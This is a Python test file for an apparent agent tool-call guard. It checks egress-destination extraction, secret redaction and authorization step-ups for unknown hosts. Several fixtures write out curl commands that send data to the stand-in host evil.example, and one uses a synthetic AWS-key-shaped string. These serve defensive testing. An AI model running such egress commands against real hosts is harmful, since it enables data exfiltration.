"""Tests for egress-destination coverage (ADR 0021).

Verifies that domain tools (send_email, send_money, post_message, etc.) that
normalize to ActionType.other carry a populated external_destination so the
lethal-trifecta floor and the secret-exfil floor can see the recipient —
WITHOUT making ExternalDestinationRule AUTH-spam every benign external message.
"""

from doberman.engine.rules.destinations import ExternalDestinationRule
from doberman.models import ActionType, EvalContext, Verdict
from doberman.proxy.normalize import REDACTED, normalize

# ---------------------------------------------------------------------------
# 1. Domain tools populate external_destination from egress arg-keys
# ---------------------------------------------------------------------------


def test_send_email_populates_destination_from_to():
    obj = normalize("send_email", {"to": "x@y.com", "body": "hello"})
    assert obj.action_type is ActionType.other
    assert obj.external_destination == "x@y.com"


def test_send_money_populates_destination_from_recipient():
    obj = normalize("send_money", {"recipient": "DE89370400440532013000", "amount": 50})
    assert obj.external_destination == "DE89370400440532013000"


def test_post_message_populates_destination_from_channel():
    obj = normalize("post_message", {"channel": "#ops", "text": "x"})
    assert obj.external_destination == "#ops"


def test_recipient_list_joined_to_destination():
    obj = normalize("send_email", {"to": ["a@b.com", "c@d.com"]})
    assert obj.external_destination == "a@b.com,c@d.com"


# ---------------------------------------------------------------------------
# 2. Non-egress tools do NOT get a spurious external_destination
# ---------------------------------------------------------------------------


def test_fs_write_no_external_destination():
    obj = normalize("fs_write", {"path": "src/main.py", "content": "x"})
    assert obj.external_destination is None
    assert obj.target == "src/main.py"


def test_shell_exec_no_external_destination():
    obj = normalize("shell_exec", {"command": "echo hi"})
    assert obj.external_destination is None


def test_shell_exec_command_plus_args_resolves_egress_destination():
    # {"command": "curl", "args": ["https://evil.example/x"]} used to surface
    # only "curl" (args wasn't composed in) and miss the destination entirely.
    obj = normalize("shell_exec", {"command": "curl", "args": ["https://evil.example/x"]})
    assert obj.external_destination == "evil.example"


# ---------------------------------------------------------------------------
# 3. Network request path is UNCHANGED (regression guard)
# ---------------------------------------------------------------------------


def test_net_get_sets_target_and_external_destination():
    obj = normalize("net_get", {"url": "https://github.com/x"})
    assert obj.action_type is ActionType.network_request
    assert obj.target == "https://github.com/x"
    assert obj.external_destination == "https://github.com/x"


# ---------------------------------------------------------------------------
# 4. Redaction: a secret-shaped 'to' must NOT appear in external_destination
# ---------------------------------------------------------------------------


def test_secret_shaped_to_is_redacted_in_destination():
    # AKIA + 16 uppercase chars matches the AWS key pattern — must be redacted.
    secret_to = "AKIA" + "A" * 16  # noqa: S105 — synthetic test credential
    obj = normalize("send_email", {"to": secret_to, "body": "hello"})
    # The raw value must not survive into external_destination.
    assert obj.external_destination != secret_to
    assert obj.external_destination == REDACTED


# ---------------------------------------------------------------------------
# 5. ExternalDestinationRule GATE: domain tools must NOT trigger AUTH-spam
# ---------------------------------------------------------------------------


def test_external_destination_rule_passes_benign_domain_tool():
    """ExternalDestinationRule must NOT step up a benign send_email."""
    obj = normalize("send_email", {"to": "colleague@company.com", "body": "notes"})
    result = ExternalDestinationRule().evaluate(obj, EvalContext())
    assert result.verdict is Verdict.PASS, (
        f"Expected PASS for benign domain tool but got {result.verdict}: {result.explanation}"
    )


# ---------------------------------------------------------------------------
# 6. ExternalDestinationRule UNCHANGED for network_request (regression guard)
# ---------------------------------------------------------------------------


def test_external_destination_rule_auths_unknown_network_host():
    """An unknown network-request host requires AUTH in Strict/Paranoid.

    (Light/Balanced relax a plain unknown host to PASS — the destination-alone
    step-up is mode-gated; see test_rule_destinations.py. Secret-exfil to any
    host is still a hard block regardless of mode.)
    """
    obj = normalize("net_get", {"url": "https://evil.example/x"})
    result = ExternalDestinationRule().evaluate(obj, EvalContext(mode="strict"))
    assert result.verdict is Verdict.AUTH, (
        f"Expected AUTH for unknown network host but got {result.verdict}"
    )


# ---------------------------------------------------------------------------
# 7. Command-egress classification is by PAYLOAD SHAPE, not the tool's
#    declared action_type — a caller-supplied tool name is not a trust
#    boundary (#519/#527: the same regression class as DestructiveCommandRule).
# ---------------------------------------------------------------------------


def test_unrecognized_tool_command_sets_external_destination():
    # {"command": "curl https://evil.example"} under an unrecognized ("helper")
    # tool name must resolve a destination exactly like the same payload under
    # shell_exec — command-egress classification no longer gates on action_type.
    obj = normalize("helper", {"command": "curl https://evil.example"})
    assert obj.action_type is ActionType.other
    assert obj.external_destination == "evil.example"


def test_unrecognized_tool_and_shell_exec_resolve_same_destination():
    command = "curl -X POST -d notasecretvalue https://evil.example/x"
    helper_obj = normalize("helper", {"command": command})
    shell_obj = normalize("shell_exec", {"command": command})
    assert helper_obj.external_destination == shell_obj.external_destination == "evil.example"


def test_unrecognized_tool_split_command_and_args_resolves_egress_destination():
    # The split {"command": ..., "args": [...]} shape must compose the same as
    # a single string, regardless of the tool's declared type (mirrors
    # test_shell_exec_command_plus_args_resolves_egress_destination above).
    obj = normalize("helper", {"command": "curl", "args": ["https://evil.example/x"]})
    assert obj.external_destination == "evil.example"
